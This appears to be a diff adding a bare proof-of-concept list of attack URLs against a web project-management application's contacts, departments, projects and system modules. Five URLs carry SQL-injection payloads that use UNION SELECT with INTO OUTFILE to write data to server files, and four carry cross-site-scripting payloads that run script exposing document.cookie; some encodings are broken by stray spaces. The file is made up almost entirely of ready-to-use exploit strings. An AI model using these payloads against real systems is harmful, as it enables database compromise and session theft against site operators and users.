@@ -1,0 +1,14 @@
+SQL-injection:
+
+http://www.example.com/index.php?m=contacts&search_string=0%27%29%20UNION%20SELECT%20version(),2,3,4,5,6,7,8, 9,10,11%20INTO%20OUTFILE%20%27file.txt%27%20--%202
+http://www.example.com/index.php?m=contacts&where=%27%29%20UNION%20SELECT%20version(),2,3,4,5,6,7,8,9,10,11%2 0INTO%20OUTFILE%20%27/tmp/file.txt%27%20--%202
+http://www.example.com/index.php?m=departments&dept_id=%27%20UNION%20SELECT%20version%28%29%20INTO%20OUTFILE% 20%27/tmp/file.txt%27%20--%202
+http://www.example.com/?m=projects&update_project_status=1&project_status=1&project_id[]=%27%20UNION%20SELECT %20version%28%29%20INTO%20OUTFILE%20%27/tmp/file.txt%27%20--%202
+http://www.example.com/?m=system&a=billingcode&company_id=0%20UNION%20SELECT%201,2,3,4,5,6%20INTO%20OUTFILE%2 0%27/tmp/file.txt%27%20--%202
+
+Cross-site scripting:
+
+http://www.example.com/?m=public&a=color_selector&callback=%3C/script%3E%3Cscript%3Ealert%28document.cookie%2 9;%3C/script%3E
+http://www.example.com/?m=public&a=date_format&field=%3C/script%3E%3Cscript%3Ealert%28document.cookie%29;%3C/ script%3E
+http://www.example.com/index.php?m=contacts&a=addedit&contact_id=0&company_id=1&company_name=%22%20onmouseove r=%22javascript:alert%28document.cookie%29%22
+http://www.example.com/index.php?a=day_view&date=%22%20onmouseover=%22javascript:alert%28document.cookie%29%2 2
